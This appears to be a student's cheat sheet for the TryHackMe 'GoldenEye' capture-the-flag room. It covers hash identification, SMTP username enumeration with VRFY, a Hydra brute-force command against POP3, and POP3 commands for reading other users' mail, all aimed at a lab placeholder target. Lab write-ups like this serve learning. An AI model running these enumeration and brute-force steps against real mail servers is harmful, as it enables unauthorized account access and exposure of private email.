# 🕵️ GoldenEye Room THM

## 1. Identifiers & Decoding

Tools for when you find a "mess" of characters.

### **A. Hash Identification**

- **`hash-identifier`**: The classic built-in tool. Just run the command and paste your string.
    
- **`nth` (Name That Hash)**: The modern alternative. More accurate and provides Hashcat mode numbers.
    
    - _Usage:_ `nth --text "your_hash_here"`

### **B. HTML Entity Decoding**

If a string looks like `&#73;&#110;...`, it is encoded for web browsers. Use Python to reveal the cleartext:

```sh
python3 -c "import html; print(html.unescape('&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;'))"
```

---
## 2. SMTP Enumeration (Port 25)

**Purpose:** Finding valid usernames on the system via the `VRFY` command.

### **Method 1: Manual (Netcat)**

1. **Connect:** `nc -nv <TARGET_IP> 25`
    
2. **Announce:** `HELO kali.local`
    
3. **Test User:** `VRFY jhon`

### **Method 2: Automated (smtp-user-enum)**

Faster for large wordlists:

```sh
smtp-user-enum -M VRFY -U /path/to/wordlist.txt -t <TARGET_IP>
```

---
## 3. POP3 Analysis (Ports 55006, 55007)

**Purpose:** Pulling emails (and secrets) from the server.

### **SMTP vs. POP3**

| **Feature**   | **SMTP (25)**          | **POP3 (55006/7)**                   |
| ------------- | ---------------------- | ------------------------------------ |
| **Direction** | Outgoing (Push)        | Incoming (Pull)                      |
| **Lab Goal**  | Verify if users exist. | Read their private emails.           |
| **Security**  | Often plain text.      | 55006 (SSL/Encrypted), 55007 (Plain) |

### **Connection Methods**

- **For 55007 (Plaintext):** Use Netcat.
    
    - `nc -nv <TARGET_IP> 55007`
        
- **For 55006 (SSL/TLS):** Netcat will fail; use OpenSSL.
    
    - `openssl s_client -connect <TARGET_IP>:55006 -quiet`

---
## 4. Bruteforcing & Entry

Why we target POP3 instead of SMTP: SMTP usually only lets you _send_ mail; POP3 lets you _read_ it (where the passwords/coordinates are hidden).

### **Hydra Syntax (POP3)**

```sh
hydra -L names.txt -P /usr/share/wordlists/fasttrack.txt <TARGET_IP> pop3 -s 55007 -V -f
```

- `-s`: Specific port.
    
- `-V`: Verbose (see every attempt).
    
- `-f`: Finish after the first success.

---
## 5. The POP3 "Heist" Commands

Once you see `+OK Logged in`, the protocol is "dumb"—there is no help menu. Use these:

|**Command**|**Action**|
|---|---|
|**`STAT`**|Shows number of emails and total size.|
|**`LIST`**|Lists emails by ID number.|
|**`RETR [ID]`**|Retrieves the content of a specific email (e.g., `RETR 1`).|
|**`DELE [ID]`**|Marks an email for deletion.|
|**`QUIT`**|Saves changes and exits.|

---
## 💡 Pro-Tip: Netcat `-nv`

- **`-n`**: **No DNS.** Don't waste time trying to resolve names.
    
- **`-v`**: **Verbose.** Tells you if the port is actually open or if the connection was refused.

